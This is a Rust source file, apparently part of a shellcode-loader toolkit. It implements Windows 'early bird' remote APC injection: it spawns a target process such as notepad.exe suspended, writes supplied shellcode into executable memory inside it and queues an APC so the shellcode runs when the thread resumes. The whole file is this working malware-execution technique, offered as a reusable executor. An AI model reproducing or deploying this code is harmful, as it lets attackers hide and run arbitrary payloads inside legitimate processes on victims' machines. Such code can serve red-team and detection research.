use shared::{check, Executor};

use std::ffi::{c_void, CString};
use std::mem::{transmute, zeroed};
use std::ptr::null_mut;

use windows_sys::Win32::Foundation::{CloseHandle, FALSE};

use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;

use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, QueueUserAPC, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA,
};

/// Remote APC injection in user-mode with early bird
pub struct RemoteUserAPCInjectionExecutor {
    pub process_name: String,
}

impl Executor for RemoteUserAPCInjectionExecutor {
    fn execute(&self, shellcode: Vec<u8>) -> anyhow::Result<()> {
        let shellcode_size = shellcode.len();
        unsafe {
            // "C:\\Windows\\System32\\notepad.exe" as default
            let app_path = CString::new(self.process_name.clone()).unwrap();
            let mut si: STARTUPINFOA = zeroed();
            let mut pi: PROCESS_INFORMATION = zeroed();

            let res = CreateProcessA(
                app_path.as_ptr() as *const u8,
                null_mut(),
                null_mut(),
                null_mut(),
                false as i32,
                CREATE_SUSPENDED,
                null_mut(),
                null_mut(),
                &mut si,
                &mut pi,
            );
            check!(res != FALSE);

            let victim_process_handler = pi.hProcess;
            let victim_thread_handler = pi.hThread;

            let remote_addr = VirtualAllocEx(
                victim_process_handler,
                null_mut(),
                shellcode_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            check!(!remote_addr.is_null());

            let res = WriteProcessMemory(
                victim_process_handler,
                remote_addr,
                shellcode.as_ptr() as *const c_void,
                shellcode_size,
                null_mut(),
            );
            check!(res != FALSE);

            let status = QueueUserAPC(transmute(remote_addr), victim_thread_handler, 0);
            check!(status != 0);

            ResumeThread(victim_thread_handler);
            CloseHandle(victim_process_handler);
        }
        Ok(())
    }
}

pub struct LocalUserAPCInjectionExecutor;
